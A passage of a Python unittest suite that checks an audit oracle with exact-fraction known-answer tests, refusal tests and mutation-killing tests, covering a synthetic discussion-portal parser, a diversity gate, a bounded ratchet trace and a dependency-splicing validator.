#!/usr/bin/env python3
"""AUDIT-104 R5 Mutation-Killing, Single-Conjunct & Known-Answer Live-Path Test Suite.

Covers:
  1. Hand-computed known-answer mini-portal live-path test (`parse_discussion_5_portal` ->
     `run_reference_invariants` -> `certify_siliconcordat_d5_audit` -> `run_live_audit`)
     plus exact hand-computed pure-Q unit witnesses for all 3 Law-2b invariants (A, B, C)
     and the Reply 9.1 `-49.0005x` decay blowup refutation.
  2. Complete single-fault R5 & individual boolean-conjunct deletion matrix killing 100.0%
     of mutants on BOTH `siliconcordat_d5_oracle.py` and `siliconcordat_d5_audit.py`.

Zero bare asserts, zero float literals, 100% Python 3 stdlib.
"""

from __future__ import annotations

from contextlib import redirect_stdout
import copy
from fractions import Fraction
import hashlib
import io
import json
from pathlib import Path
import sys
import tempfile
import unittest

_SCRIPT_DIR = str(Path(__file__).resolve().parent)
if _SCRIPT_DIR not in sys.path:
    sys.path.insert(0, _SCRIPT_DIR)

import siliconcordat_d5_audit as audit  # noqa: E402
import siliconcordat_d5_oracle as oracle  # noqa: E402
from siliconcordat_d5_oracle import CordatAuditError  # noqa: E402


def _make_float() -> object:
    """Create a runtime IEEE-754 float via json.loads so source contains zero float literals."""
    return json.loads("3.14")


def _write_mini_portal(root: Path) -> dict[str, object]:
    """Create a hand-computed synthetic Discussion #5 portal directory and return exact pins."""
    root.mkdir(parents=True, exist_ok=True)
    raw_obj = {
        "number": 5,
        "title": "mini agentic portal",
        "author": {"login": "tester"},
        "createdAt": "2026-10-31T00:00:00Z",
        "updatedAt": "2026-11-18T00:00:00Z",
        "comments": {
            "nodes": [
                {"replies": {"nodes": [{}, {}]}},
                {"replies": {"nodes": [{}]}},
            ]
        },
    }
    raw_bytes = (json.dumps(raw_obj, sort_keys=True) + "\n").encode("utf-8")
    md_text = (
        "# Mini Portal\n"
        "### SPLICEWARE\n"
        "self.symp_matrix = tension\n"
        "self.symp_matrix = budget\n"
        'core::arch::asm!("wbinvd", "mov cr3, rax")\n'
        "write_volatile(fpga, 0xABCDE001)\n"
        "adaptive_decay_pressure = decay_factor * (1.0 + (1.0 / (next_tension + 1e-5)))\n"
        "h = hash(input_latent.sum().item())\n"
    )
    md_bytes = md_text.encode("utf-8")
    (root / "discussion_5_raw.json").write_bytes(raw_bytes)
    (root / "discussion_5_full.md").write_bytes(md_bytes)
    return {
        "discussion_5_raw_json_bytes": len(raw_bytes),
        "discussion_5_raw_json_sha256": hashlib.sha256(raw_bytes).hexdigest(),
        "discussion_5_full_md_bytes": len(md_bytes),
        "discussion_5_full_md_sha256": hashlib.sha256(md_bytes).hexdigest(),
    }


def _valid_splice_pair() -> tuple[dict, dict]:
    manifest = {
        "splice_version": "0.1.0",
        "capability": "bounded_ratchet_gate",
        "donor": {
            "uri": "https://github.com/Moissanite-Labs/weft",
            "commit": "a" * 40,
            "license": "MIT",
            "entry_symbols": ["RatchetGate.step", "RatchetGate.snap"],
        },
        "severance_map": {
            "donor_logger": "host://aletheia/strict_io",
            "numpy": "stdlib://fractions",
        },
        "seam": {
            "path": "aletheia/seams/bounded_ratchet_seam.py",
            "exports": ["evaluate_ratchet_step"],
        },
        "verification": {
            "command": "python3 -I -B tests/test_bounded_ratchet_seam.py",
            "max_host_files_touched": 2,
        },
    }
    exec_rec = {
        "states_executed": ["PROBE", "SEVER", "EXTRACT", "WEAVE", "LOCK"],
        "probe_foreign_imports": ["donor_logger", "numpy"],
        "lockfiles_before_sha256": {"pyproject.toml": "1" * 64},
        "lockfiles_after_sha256": {"pyproject.toml": "1" * 64},
        "human_lockfile_override": False,
        "host_imports_by_file": {
            "aletheia/seams/bounded_ratchet_seam.py": ["vendor/splices/bounded_ratchet_gate/core/gate.py"],
            "aletheia/cli.py": ["aletheia/seams/bounded_ratchet_seam.py"],
        },
        "core_files_sha256_after_extract": {"vendor/splices/bounded_ratchet_gate/core/gate.py": "2" * 64},
        "core_files_sha256_after_lock": {"vendor/splices/bounded_ratchet_gate/core/gate.py": "2" * 64},
        "host_files_touched": [
            "vendor/splices/bounded_ratchet_gate/core/gate.py",
            "aletheia/seams/bounded_ratchet_seam.py",
            "tests/test_bounded_ratchet_seam.py",
        ],
        "lock_exit_code": 0,
        "ejection_build_ok": True,
        "vendor_dir_is_symlink": False,
        "airlock_envelope_keys": ["claim_ledger", "pinned_input_sha256s", "artifact_and_tests"],
        "verifier_zone_a_board_read_access": False,
    }
    return manifest, exec_rec


def _valid_cert_inputs() -> tuple[dict, dict]:
    portal = copy.deepcopy(audit.STANDALONE_PINNED_PORTAL)
    invs = oracle.run_reference_invariants()
    return portal, invs


class TestKnownAnswerLivePath(unittest.TestCase):
    """Hand-computed known-answer verification across mini-portal & all 3 Law-2b invariants."""

    def test_hand_computed_mini_portal_and_invariants(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            root = Path(td) / "mini_portal"
            pins = _write_mini_portal(root)
            cert = audit.run_live_audit(root, expected_pins=pins)
            self.assertEqual(cert["execution_mode"], "live_portal_recount")
            self.assertTrue(cert["live_portal_recounted"])
            self.assertTrue(cert["audit_gate"]["certified"])

            p = cert["portal_summary"]
            self.assertEqual(p["top_level_comments"], 2)
            self.assertEqual(p["replies"], 3)
            self.assertEqual(p["total_entries_incl_op"], 6)
            self.assertEqual(p["markdown_line_count"], 8)
            self.assertEqual(p["spliceware_marker_count"], 1)
            self.assertEqual(p["pseudocode_defect_total"], 6)
            self.assertEqual(p["pseudocode_defect_counts"]["reply91_symp_matrix_scalar_overwrite"], 2)

            # Exact hand-computed Reply 9.1 refutation:
            # base=1/20, T=0, eps=1/100000 -> pressure=100001/20 -> mult = 1 - 100001/2000 = -98001/2000
            r91 = cert["law2b_invariants"]["reply91_decay_refutation"]
            self.assertEqual(r91["d5_reply91_pressure"], "100001/20")
            self.assertEqual(r91["d5_reply91_multiplier"], "-98001/2000")
            self.assertEqual(r91["d5_reply91_multiplier_dec4"], "-49.0005")
            self.assertTrue(r91["d5_reply91_sign_flip_blowup"])
            self.assertEqual(r91["law2b_bounded_mult_at_calm"], "19/20")
            self.assertEqual(r91["law2b_bounded_mult_at_peak"], "1/1")
            self.assertTrue(r91["law2b_strictly_stable"])

            # Exact hand-computed #16 calibration gap proof:
            # H0=(3,0,0,3), r0=(1,-1) -> perm drift^2 = 36+8=44, R^2=1; flip drift^2 = 8, R^2=-19/5
            cg = cert["law2b_invariants"]["invariant_b_monotone_ratchet"]["calibration_gap_witness"]
            self.assertEqual(cg["radius_sq"], "16/1")
            self.assertEqual(cg["perm_drift_sq"], "44/1")
            self.assertEqual(cg["perm_r2"], "1/1")
            self.assertEqual(cg["flip_drift_sq"], "8/1")
            self.assertEqual(cg["flip_r2"], "-19/5")
            self.assertEqual(cg["drift_ratio_perm_over_flip"], "11/2")
            self.assertTrue(cg["calibration_gap_proved"])

            # Exact hand-computed Invariant B trace:
            # s1: (1,1) drift^2=2<=16, beh=85/100 -> commit, spent=2
            # s2: (2,1) drift^2=5<=16, beh=-19/5<80/100 -> snap, spent=4
            # s3: (6,1) drift^2=37>16 -> snap, spent=6
            # s4: (2,1) drift^2=5<=16, beh=90/100>=85/100 -> commit, spent=9
            # s5: spent+2=11>10 -> BUDGET_EXCEEDED snap, spent stays 9!
            rt = cert["law2b_invariants"]["invariant_b_monotone_ratchet"]["trace_witness"]
            self.assertEqual(rt["committed_count"], 2)
            self.assertEqual(rt["rollback_count"], 3)
            self.assertEqual(rt["total_spent"], "9/1")
            self.assertEqual(rt["final_drift_sq"], "5/1")
            self.assertEqual(rt["final_committed_weights"], ["2/1", "1/1"])
            self.assertEqual(rt["final_best_behavior"], "9/10")


class TestOracleHelpersAndPortalR5(unittest.TestCase):
    """Kill all primitive helper & portal parser mutants in oracle."""

    def test_scalar_helpers_and_reject_floats(self) -> None:
        self.assertEqual(oracle._require_exact_int(0, "x"), 0)
        with self.assertRaisesRegex(CordatAuditError, "exact-int"):
            oracle._require_exact_int(True, "x")
        with self.assertRaisesRegex(CordatAuditError, "exact-int"):
            oracle._require_exact_int("1", "x")

        self.assertIs(oracle._require_exact_bool(True, "b"), True)
        with self.assertRaisesRegex(CordatAuditError, "exact-bool"):
            oracle._require_exact_bool(1, "b")

        self.assertEqual(oracle._require_exact_fraction(2, "f"), Fraction(2, 1))
        with self.assertRaisesRegex(CordatAuditError, "exact-fraction"):
            oracle._require_exact_fraction(True, "f")
        with self.assertRaisesRegex(CordatAuditError, "exact-fraction"):
            oracle._require_exact_fraction("2", "f")

        self.assertEqual(oracle._require_clean_ascii("a ~", "s"), "a ~")
        for bad in ("", " pad", "a\tb", "a\x7fb", 5):
            with self.assertRaisesRegex(CordatAuditError, "clean-ascii"):
                oracle._require_clean_ascii(bad, "s")

        # reject_floats on direct float, complex, dict key, dict value, list item, set, frozenset
        flt = _make_float()
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden"):
            oracle.reject_floats(flt)
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden"):
            oracle.reject_floats(complex(1, 2))
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden"):
            oracle.reject_floats({"k": [1, flt]})
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden"):
            oracle.reject_floats({flt: 1})
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden"):
            oracle.reject_floats({flt})
        with self.assertRaisesRegex(CordatAuditError, "float-forbidden"):
            oracle.reject_floats(frozenset([flt]))

        # frac_dec exact boundary digits=1 & negative value & refusal
        self.assertEqual(oracle.frac_dec(Fraction(-1, 2), 1), "-0.5")
        with self.assertRaisesRegex(CordatAuditError, "digits-pos"):
            oracle.frac_dec(Fraction(1, 2), 0)

        # _parse_frac_str canonical reduced boundaries & refusals (leading zeros, -0, unreduced, oversized digits)
        self.assertEqual(oracle._parse_frac_str("-5/2", "f"), Fraction(-5, 2))
        self.assertEqual(oracle._parse_frac_str("0/1", "f"), Fraction(0, 1))
        for bad in ("5", "x/2", "1/-2", "--5/2", "-/2", "+5/2", "1/0", "01/2", "1/02", "-0/1"):
            with self.assertRaisesRegex(CordatAuditError, "frac-str:"):
                oracle._parse_frac_str(bad, "f")
        with self.assertRaisesRegex(CordatAuditError, "frac-str-digits:"):
            oracle._parse_frac_str("1" * 5000 + "/1", "f")
        for unred in ("2/4", "-2/4", "0/2"):
            with self.assertRaisesRegex(CordatAuditError, "frac-str-unreduced:"):
                oracle._parse_frac_str(unred, "f")

        # _require_vec boundaries & refusals
        self.assertEqual(oracle._require_vec([1], 1, "v"), [Fraction(1, 1)])
        with self.assertRaisesRegex(CordatAuditError, "vec-nonempty"):
            oracle._require_vec([], None, "v")
        with self.assertRaisesRegex(CordatAuditError, "vec-nonempty"):
            oracle._require_vec("12", None, "v")
        with self.assertRaisesRegex(CordatAuditError, "vec-dim"):
            oracle._require_vec([1, 2], 1, "v")

    def test_portal_parser_refusals(self) -> None:
        with tempfile.TemporaryDirectory() as td:
            base = Path(td)
            j_p = base / "raw.json"
            m_p = base / "full.md"
            m_p.write_text("# ok\n", encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-files-missing"):
                oracle.parse_discussion_5_portal(j_p, m_p)
            j_p.write_text("[]", encoding="utf-8")
            m_p.unlink()
            with self.assertRaisesRegex(CordatAuditError, "portal-files-missing"):
                oracle.parse_discussion_5_portal(j_p, m_p)

            m_p.write_text("# ok\n", encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-json-shape"):
                oracle.parse_discussion_5_portal(j_p, m_p)
            j_p.write_text(json.dumps({"comments": []}), encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-json-shape"):
                oracle.parse_discussion_5_portal(j_p, m_p)

            base_obj = {
                "number": 5, "title": "t", "author": "not-dict",
                "createdAt": "2026-01-01", "updatedAt": "2026-01-02",
                "comments": {"nodes": [{"replies": {"nodes": []}}]},
            }
            j_p.write_text(json.dumps(base_obj), encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-author-dict"):
                oracle.parse_discussion_5_portal(j_p, m_p)

            base_obj["author"] = {"login": "a"}
            base_obj["comments"] = {"nodes": "bad"}
            j_p.write_text(json.dumps(base_obj), encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-comments-nonempty"):
                oracle.parse_discussion_5_portal(j_p, m_p)

            base_obj["comments"] = {"nodes": []}
            j_p.write_text(json.dumps(base_obj), encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-comments-nonempty"):
                oracle.parse_discussion_5_portal(j_p, m_p)

            base_obj["comments"] = {"nodes": ["not-dict"]}
            j_p.write_text(json.dumps(base_obj), encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-comment-shape"):
                oracle.parse_discussion_5_portal(j_p, m_p)

            base_obj["comments"] = {"nodes": [{"replies": "bad"}]}
            j_p.write_text(json.dumps(base_obj), encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-comment-shape"):
                oracle.parse_discussion_5_portal(j_p, m_p)

            base_obj["comments"] = {"nodes": [{"replies": {"nodes": "bad"}}]}
            j_p.write_text(json.dumps(base_obj), encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-replies-list"):
                oracle.parse_discussion_5_portal(j_p, m_p)

            base_obj["comments"] = {"nodes": [{"replies": {"nodes": []}}]}
            j_p.write_text(json.dumps(base_obj), encoding="utf-8")
            # Exact boundary md_lines == 1 passes (kills md_lines >= 1 -> md_lines > 1!)
            m_p.write_text("# single line\n", encoding="utf-8")
            self.assertEqual(oracle.parse_discussion_5_portal(j_p, m_p)["markdown_line_count"], 1)
            m_p.write_text("", encoding="utf-8")
            with self.assertRaisesRegex(CordatAuditError, "portal-md-nonempty"):
                oracle.parse_discussion_5_portal(j_p, m_p)


class TestThreeInvariantsR5(unittest.TestCase):
    """Kill EVERY guard, boundary, and boolean conjunct in Invariants A, B, and C."""

    def test_invariant_a_boundaries_and_refusals(self) -> None:
        base_cands = [
            {"id": "a", "vector": [0, 0], "cluster": "c1", "fitness": 1, "passed_invariants": True},
            {"id": "b", "vector": [1, 0], "cluster": "c2", "fitness": 1, "passed_invariants": True},
        ]
        # Exact boundary valid call: k=2, archive len=1, T=0, T=T_max, alpha_base=0, nov_cap=0, min_spread=0, min_dist=2, min_d2=1
        res_min = oracle.evaluate_anti_homogenization_gate(
            base_cands, [[0, 0]], tension=0, tension_max=1, alpha_base=0,
            novelty_cap_sq=0, min_cohort_spread_sq=0, min_distinct_vectors=2, min_renyi2_diversity=1,
        )
        self.assertTrue(res_min["gate_passed"])
        self.assertEqual(res_min["selected_candidate_id"], "a")

        res_tmax = oracle.evaluate_anti_homogenization_gate(
            base_cands, [[0, 0]], tension=1, tension_max=1, alpha_base=1,
            novelty_cap_sq=1, min_cohort_spread_sq=1, min_distinct_vectors=2, min_renyi2_diversity=2,
        )
        self.assertTrue(res_tmax["gate_passed"])
        self.assertEqual(res_tmax["alpha_effective"], "0/1")

        # All candidates failing invariants -> NO_FEASIBLE_CANDIDATE_PASSED_INVARIANTS
        no_elig = [dict(c, passed_invariants=False) for c in base_cands]
        res_no = oracle.evaluate_anti_homogenization_gate(
            no_elig, [[0, 0]], tension=0, tension_max=1, alpha_base=1,
            novelty_cap_sq=1, min_cohort_spread_sq=1, min_distinct_vectors=2, min_renyi2_diversity=2,
        )
        self.assertFalse(res_no["gate_passed"])
        self.assertIsNone(res_no["selected_candidate_id"])
        self.assertEqual(res_no["veto_reasons"], ["NO_FEASIBLE_CANDIDATE_PASSED_INVARIANTS"])

        # Exactly 1 feasible candidate + diverse infeasible decoys -> INSUFFICIENT_FEASIBLE_COHORT_FOR_DIVERSITY
        one_elig = [
            {"id": "solo", "vector": [0, 0], "cluster": "c1", "fitness": 1, "passed_invariants": True},
            {"id": "decoy-a", "vector": [10, 0], "cluster": "c2", "fitness": 1, "passed_invariants": False},
            {"id": "decoy-b", "vector": [0, 10], "cluster": "c3", "fitness": 1, "passed_invariants": False},
        ]
        res_one = oracle.evaluate_anti_homogenization_gate(
            one_elig, [[0, 0]], tension=0, tension_max=1, alpha_base=1,
            novelty_cap_sq=1, min_cohort_spread_sq=1, min_distinct_vectors=2, min_renyi2_diversity=2,
        )
        self.assertFalse(res_one["gate_passed"])
        self.assertIsNone(res_one["selected_candidate_id"])
        self.assertEqual(res_one["veto_reasons"], ["INSUFFICIENT_FEASIBLE_COHORT_FOR_DIVERSITY"])

        # SC104-BYPASS-01 closure: 2 identical feasible echo-chamber clones + 2 diverse infeasible decoys MUST be vetoed!
        decoy_masked_clones = [
            {"id": "clone-1", "vector": [1, 0], "cluster": "same", "fitness": 1, "passed_invariants": True},
            {"id": "clone-2", "vector": [1, 0], "cluster": "same", "fitness": 1, "passed_invariants": True},
            {"id": "decoy-1", "vector": [10, 0], "cluster": "decoyA", "fitness": 1, "passed_invariants": False},
            {"id": "decoy-2", "vector": [0, 10], "cluster": "decoyB", "fitness": 1, "passed_invariants": False},
        ]
        res_decoy = oracle.evaluate_anti_homogenization_gate(
            decoy_masked_clones, [[0, 0]], tension=0, tension_max=1, alpha_base=0,
            novelty_cap_sq=1, min_cohort_spread_sq=2, min_distinct_vectors=2, min_renyi2_diversity=2,
        )
        self.assertFalse(res_decoy["gate_passed"])
        self.assertIsNone(res_decoy["selected_candidate_id"])
        self.assertEqual(res_decoy["distinct_vectors"], 1)
        self.assertEqual(res_decoy["cohort_spread_sq"], "0/1")
        self.assertEqual(res_decoy["effective_diversity_d2"], "1/1")
        self.assertEqual(
            res_decoy["veto_reasons"],
            [
                "MONOCULTURE_DISTINCT_VECTORS_BELOW_MIN",
                "MONOCULTURE_COHORT_SPREAD_BELOW_MIN",
                "MONOCULTURE_RENYI2_DIVERSITY_BELOW_MIN",
            ],
        )

        # Isolated monoculture veto triggers (each of the 3 individually!)
        # 1) distinct_vectors < min_distinct_vectors alone (spread and D2 pass)
        c_dup = [
            {"id": "a", "vector": [0, 0], "cluster": "c1", "fitness": 1, "passed_invariants": True},
            {"id": "b", "vector": [0, 0], "cluster": "c2", "fitness": 1, "passed_invariants": True},
            {"id": "c", "vector": [3, 0], "cluster": "c3", "fitness": 1, "passed_invariants": True},
        ]
        r_v1 = oracle.evaluate_anti_homogenization_gate(
            c_dup, [[0, 0]], tension=0, tension_max=1, alpha_base=0,
            novelty_cap_sq=0, min_cohort_spread_sq=1, min_distinct_vectors=3, min_renyi2_diversity=2,
        )
        self.assertEqual(r_v1["veto_reasons"], ["MONOCULTURE_DISTINCT_VECTORS_BELOW_MIN"])

        # 2) spread < min_cohort_spread_sq alone
        r_v2 = oracle.evaluate_anti_homogenization_gate(
            base_cands, [[0, 0]], tension=0, tension_max=1, alpha_base=0,
            novelty_cap_sq=0, min_cohort_spread_sq=2, min_distinct_vectors=2, min_renyi2_diversity=2,
        )
        self.assertEqual(r_v2["veto_reasons"], ["MONOCULTURE_COHORT_SPREAD_BELOW_MIN"])

        # 3) D2 < min_renyi2_diversity alone
        c_same_cl = [dict(c, cluster="only") for c in base_cands]
        r_v3 = oracle.evaluate_anti_homogenization_gate(
            c_same_cl, [[0, 0]], tension=0, tension_max=1, alpha_base=0,
            novelty_cap_sq=0, min_cohort_spread_sq=1, min_distinct_vectors=2, min_renyi2_diversity=2,
        )
        self.assertEqual(r_v3["veto_reasons"], ["MONOCULTURE_RENYI2_DIVERSITY_BELOW_MIN"])

        # Refusal guards (every conjunct isolated!)
        kw = dict(tension=0, tension_max=1, alpha_base=0, novelty_cap_sq=0, min_cohort_spread_sq=0, min_distinct_vectors=2, min_renyi2_diversity=1)
        with self.assertRaisesRegex(CordatAuditError, "ah-candidates-ge-2"):
            oracle.evaluate_anti_homogenization_gate("bad", [[0, 0]], **kw)  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "ah-candidates-ge-2"):
            oracle.evaluate_anti_homogenization_gate(base_cands[:1], [[0, 0]], **kw)
        with self.assertRaisesRegex(CordatAuditError, "ah-archive-nonempty"):
            oracle.evaluate_anti_homogenization_gate(base_cands, "bad", **kw)  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "ah-archive-nonempty"):
            oracle.evaluate_anti_homogenization_gate(base_cands, [], **kw)
        with self.assertRaisesRegex(CordatAuditError, "ah-tension-range"):
            oracle.evaluate_anti_homogenization_gate(base_cands, [[0, 0]], **{**kw, "tension": 0, "tension_max": 0})
        with self.assertRaisesRegex(CordatAuditError, "ah-tension-range"):
            oracle.evaluate_anti_homogenization_gate(base_cands, [[0, 0]], **{**kw, "tension": 2})
        with self.assertRaisesRegex(CordatAuditError, "ah-nonneg-params"):
            oracle.evaluate_anti_homogenization_gate(base_cands, [[0, 0]], **{**kw, "alpha_base": -1})
        with self.assertRaisesRegex(CordatAuditError, "ah-nonneg-params"):
            oracle.evaluate_anti_homogenization_gate(base_cands, [[0, 0]], **{**kw, "novelty_cap_sq": -1})
        with self.assertRaisesRegex(CordatAuditError, "ah-nonneg-params"):
            oracle.evaluate_anti_homogenization_gate(base_cands, [[0, 0]], **{**kw, "min_cohort_spread_sq": -1})
        with self.assertRaisesRegex(CordatAuditError, "ah-diversity-bounds"):
            oracle.evaluate_anti_homogenization_gate(base_cands, [[0, 0]], **{**kw, "min_distinct_vectors": 1})
        with self.assertRaisesRegex(CordatAuditError, "ah-diversity-bounds"):
            oracle.evaluate_anti_homogenization_gate(base_cands, [[0, 0]], **{**kw, "min_renyi2_diversity": Fraction(1, 2)})
        with self.assertRaisesRegex(CordatAuditError, "ah-archive-dim"):
            oracle.evaluate_anti_homogenization_gate(base_cands, [[0, 0], [0]], **kw)
        with self.assertRaisesRegex(CordatAuditError, "ah-cand-dict"):
            oracle.evaluate_anti_homogenization_gate(["bad", base_cands[1]], [[0, 0]], **kw)  # type: ignore[list-item]
        with self.assertRaisesRegex(CordatAuditError, "ah-dup-cand-id"):
            oracle.evaluate_anti_homogenization_gate([base_cands[0], base_cands[0]], [[0, 0]], **kw)

    def test_invariant_b_boundaries_and_refusals(self) -> None:
        s1 = {"step_id": "s1", "delta": [1], "cost": 1, "behavior_score": 1}
        # Exact boundary: drift_sq == radius_sq, spent == budget_max, beh == behavior_floor, monotone regression test
        r_eq = oracle.evaluate_monotone_ratchet_trace(
            [0],
            [s1, {"step_id": "s2", "delta": [0], "cost": 1, "behavior_score": 2}, {"step_id": "s3", "delta": [0], "cost": 1, "behavior_score": 1}],
            radius_sq=1, budget_max=3, behavior_floor=1, require_monotone_behavior=True,
        )
        self.assertEqual(r_eq["committed_count"], 2)
        self.assertEqual(r_eq["rollback_count"], 1)
        self.assertEqual(r_eq["trace"][2]["rejection_reasons"], ["BEHAVIOR_REGRESSION"])

        # Non-monotone mode allows beh >= floor even if beh < best, and rejects beh < floor (kills M049!)
        r_nonmono = oracle.evaluate_monotone_ratchet_trace(
            [0],
            [
                {"step_id": "s1", "delta": [0], "cost": 1, "behavior_score": 2},
                {"step_id": "s2", "delta": [0], "cost": 1, "behavior_score": 1},
                {"step_id": "s3", "delta": [0], "cost": 1, "behavior_score": 0},
            ],
            radius_sq=1, budget_max=3, behavior_floor=1, require_monotone_behavior=False,
        )
        self.assertEqual(r_nonmono["committed_count"], 2)
        self.assertEqual(r_nonmono["rollback_count"], 1)
        self.assertEqual(r_nonmono["trace"][2]["rejection_reasons"], ["BEHAVIOR_FLOOR_BREACH"])

        # Refusals (every conjunct!)
        with self.assertRaisesRegex(CordatAuditError, "ratchet-pos-limits"):
            oracle.evaluate_monotone_ratchet_trace([0], [s1], radius_sq=0, budget_max=1, behavior_floor=0)
        with self.assertRaisesRegex(CordatAuditError, "ratchet-pos-limits"):
            oracle.evaluate_monotone_ratchet_trace([0], [s1], radius_sq=1, budget_max=0, behavior_floor=0)
        with self.assertRaisesRegex(CordatAuditError, "ratchet-steps-nonempty"):
            oracle.evaluate_monotone_ratchet_trace([0], "bad", radius_sq=1, budget_max=1, behavior_floor=0)  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "ratchet-steps-nonempty"):
            oracle.evaluate_monotone_ratchet_trace([0], [], radius_sq=1, budget_max=1, behavior_floor=0)
        with self.assertRaisesRegex(CordatAuditError, "ratchet-step-dict"):
            oracle.evaluate_monotone_ratchet_trace([0], ["bad"], radius_sq=1, budget_max=1, behavior_floor=0)  # type: ignore[list-item]
        with self.assertRaisesRegex(CordatAuditError, "ratchet-dup-step"):
            oracle.evaluate_monotone_ratchet_trace([0], [s1, s1], radius_sq=1, budget_max=2, behavior_floor=0)
        with self.assertRaisesRegex(CordatAuditError, "ratchet-cost-pos"):
            oracle.evaluate_monotone_ratchet_trace([0], [{**s1, "cost": 0}], radius_sq=1, budget_max=2, behavior_floor=0)

        # Calibration-gap counterfactual boundaries (kills every BoolOp & comparison in prove_calibration_weight_vs_behavior_gap!)
        c_eq_perm = oracle.prove_calibration_weight_vs_behavior_gap(radius_sq=44)
        self.assertFalse(c_eq_perm["perm_norm_only_falsely_rejects"])
        self.assertTrue(c_eq_perm["flip_norm_only_falsely_accepts"])
        self.assertFalse(c_eq_perm["calibration_gap_proved"])

        c_eq_flip = oracle.prove_calibration_weight_vs_behavior_gap(radius_sq=8)
        self.assertTrue(c_eq_flip["perm_norm_only_falsely_rejects"])
        self.assertTrue(c_eq_flip["flip_norm_only_falsely_accepts"])
        self.assertTrue(c_eq_flip["calibration_gap_proved"])

        c_small_r = oracle.prove_calibration_weight_vs_behavior_gap(radius_sq=7)
        self.assertTrue(c_small_r["perm_norm_only_falsely_rejects"])
        self.assertFalse(c_small_r["flip_norm_only_falsely_accepts"])
        self.assertFalse(c_small_r["calibration_gap_proved"])

        c_bad_perm = oracle.prove_calibration_weight_vs_behavior_gap(perm_readout=(1, 1))
        self.assertFalse(c_bad_perm["perm_norm_only_falsely_rejects"])
        self.assertFalse(c_bad_perm["calibration_gap_proved"])

        c_pos_r2_flip = oracle.prove_calibration_weight_vs_behavior_gap(flip_readout=(0, -1))
        self.assertEqual(c_pos_r2_flip["flip_r2"], "2/5")
        self.assertFalse(c_pos_r2_flip["flip_norm_only_falsely_accepts"])
        self.assertFalse(c_pos_r2_flip["calibration_gap_proved"])

        c_zero_drift_flip = oracle.prove_calibration_weight_vs_behavior_gap(flip_readout=(1, -1))
        self.assertEqual(c_zero_drift_flip["drift_ratio_perm_over_flip"], "INF")
        self.assertFalse(c_zero_drift_flip["flip_norm_only_falsely_accepts"])

        with self.assertRaisesRegex(CordatAuditError, "cal-radius-pos"):
            oracle.prove_calibration_weight_vs_behavior_gap(radius_sq=0)
        with self.assertRaisesRegex(CordatAuditError, "cal-perm-readout"):
            oracle.prove_calibration_weight_vs_behavior_gap(perm_readout=[1, 1])  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "cal-perm-readout"):
            oracle.prove_calibration_weight_vs_behavior_gap(perm_readout=(1,))  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "cal-flip-readout"):
            oracle.prove_calibration_weight_vs_behavior_gap(flip_readout=[1, 1])  # type: ignore[arg-type]
        with self.assertRaisesRegex(CordatAuditError, "cal-flip-readout"):
            oracle.prove_calibration_weight_vs_behavior_gap(flip_readout=(1,))  # type: ignore[arg-type]

    def test_invariant_c_splicer_all_guards_and_violations(self) -> None:
        m, e = _valid_splice_pair()
        ok = oracle.validate_splicer_graft(m, e)
        self.assertTrue(ok["compliant"])
        self.assertEqual(ok["violations"], [])

        # Exact boundary max_host_files_touched=1 (only seam touched) + human_lockfile_override=True + valid port 1 & 65535
        m1, e1 = _valid_splice_pair()
        m1["donor"]["uri"] = "https://github.com:65535/Moissanite-Labs/weft"
        m1["verification"]["max_host_files_touched"] = 1
        e1["host_files_touched"] = ["vendor/splices/bounded_ratchet_gate/core/gate.py", "aletheia/seams/bounded_ratchet_seam.py"]
        e1["lockfiles_after_sha256"]["pyproject.toml"] = "9" * 64
        e1["human_lockfile_override"] = True
        self.assertTrue(oracle.validate_splicer_graft(m1, e1)["compliant"])
        m1_p1, e1_p1 = _valid_splice_pair()
        m1_p1["donor"]["uri"] = "https://github.com:1/Moissanite-Labs/weft"
        self.assertTrue(oracle.validate_splicer_graft(m1_p1, e1_p1)["compliant"])

        # Benign near-lookalike imports MUST NOT falsely trigger visibility breach
        m_ok2, e_ok2 = _valid_splice_pair()
        e_ok2["host_imports_by_file"]["aletheia/cli.py"].extend([
            "vendor/splices/bounded_ratchet_gate/coreutils.py",
            "from vendor.splices.bounded_ratchet_gate import seam",
        ])
        self.assertTrue(oracle.validate_splicer_graft(m_ok2, e_ok2)["compliant"])

        # Each individual execution violation isolated (incl. SC104-BYPASS-02, SC104R-RES-01, & AUDIT-104R3 from/dynamic/quoted evasions!)
        for mut, expected_code in (
            (lambda x: x.__setitem__("states_executed", ["PROBE", "LOCK"]), "STATE_MACHINE_ORDER_BREACH"),
            (lambda x: x["probe_foreign_imports"].append("unmapped"), "UNMAPPED_FOREIGN_DEPENDENCY"),
            (lambda x: x["lockfiles_after_sha256"].__setitem__("pyproject.toml", "f" * 64), "LOCKFILE_MUTATION_WITHOUT_OVERRIDE"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("vendor/splices/bounded_ratchet_gate/core"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("vendor/splices/bounded_ratchet_gate/core.py"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("vendor/splices/bounded_ratchet_gate/CORE/gate.py"), "ONE_WAY_VISIBILITY_BREACH"),
            (lambda x: x["host_imports_by_file"]["aletheia/cli.py"].append("vendor.splices.bounded_ratchet_gate.core.gate"), "ONE_WAY_VISIBILITY_BREACH"),
